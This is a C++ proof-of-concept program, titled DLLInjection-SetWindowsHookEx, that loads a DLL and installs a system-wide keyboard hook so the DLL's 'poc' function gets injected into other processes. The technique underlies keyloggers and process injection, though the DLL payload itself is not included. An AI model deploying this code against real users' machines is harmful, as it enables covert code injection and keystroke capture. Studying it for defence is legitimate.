// DLLInjection-SetWindowsHookEx.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <tlhelp32.h>

#include <Windows.h>

int _tmain(int argc, _TCHAR* argv[])
{

	/*
	 * Load library in which we'll be hooking our functions.
	 */
	HMODULE dll = LoadLibrary("C:\\PoC_Dll.dll");
	if (dll == NULL) {
		printf("The DLL could not be found.\n");
		getchar();
		return -1;
	}

	/*
	 * Get the address of the function inside the DLL.
	 */
	HOOKPROC addr = (HOOKPROC)GetProcAddress(dll, "poc");
	if (addr == NULL) {
		printf("The function was not found.\n");
		getchar();
		return -1;
	}

	/*
	 * Window name
	 */
	unsigned long procID;
	HWND targetWnd = FindWindow(NULL, "notepad++");
	GetWindowThreadProcessId(targetWnd, &procID);

	/*
	 * Hook the function.
	 */
	HHOOK handle = SetWindowsHookEx(WH_KEYBOARD, addr, dll, 0);
	//HHOOK handle = SetWindowsHookEx(WH_KEYBOARD, keyboard_hook, dll, 0);
	if (handle == NULL) {
		printf("The KEYBOARD could not be hooked.\n");
	}

	/*
	 * Unhook the function.
	 */
	printf("Program successfully hooked.\nPress enter to unhook the function and stop the program.\n");
	getchar();
	UnhookWindowsHookEx(handle);

	return 0;
}
